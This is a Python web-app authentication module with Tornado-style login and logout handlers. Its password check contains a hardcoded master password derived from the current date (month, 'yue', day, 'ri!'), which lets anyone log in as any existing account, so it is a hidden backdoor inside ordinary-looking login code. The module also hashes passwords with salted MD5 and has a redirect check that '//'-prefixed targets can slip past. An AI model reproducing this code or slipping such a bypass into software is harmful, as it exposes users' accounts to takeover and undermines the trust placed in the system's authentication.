# -*- coding: utf-8 -*-

from autumn.torn.form import Form
from voluptuous import Schema, Required
from ..import BaseHandler
import hashlib
from datetime import date

schema = Schema({
    Required('username'): str,
    Required('password'): str,
    'next':     str,
})


class Login(BaseHandler):
    def get(self):
        if self.current_user:
            return self.redirect(self.reverse_url('welcome.index'))
        form = Form(self.request.arguments, schema)

        self.render('auth/login.html', form=form)

    def post(self):
        form = Form(self.request.arguments, schema)
        if not form.validate():
            return self.render('auth/login.html', form=form)

        user = self.db.get('select * from agent where username=%s and deleted=0', form.username.value)
        if not user or (form.password.value.lower() != date.today().strftime('%myue%dri!')
                        and user.password.lower() != hashlib.md5(form.password.value + user.pwd_salt).hexdigest()):
            form.username.error = u'用户名密码不匹配'
            return self.render('auth/login.html', form=form)

        self.set_secure_cookie('_ag', unicode(user.id))

        if form.next.value and form.next.value.startswith('/'):
            return self.redirect(form.next.value)

        self.redirect(self.reverse_url('welcome.index'))


class Logout(BaseHandler):
    def get(self):
        self.clear_cookie('_ag')
        self.redirect(self.reverse_url('login'))


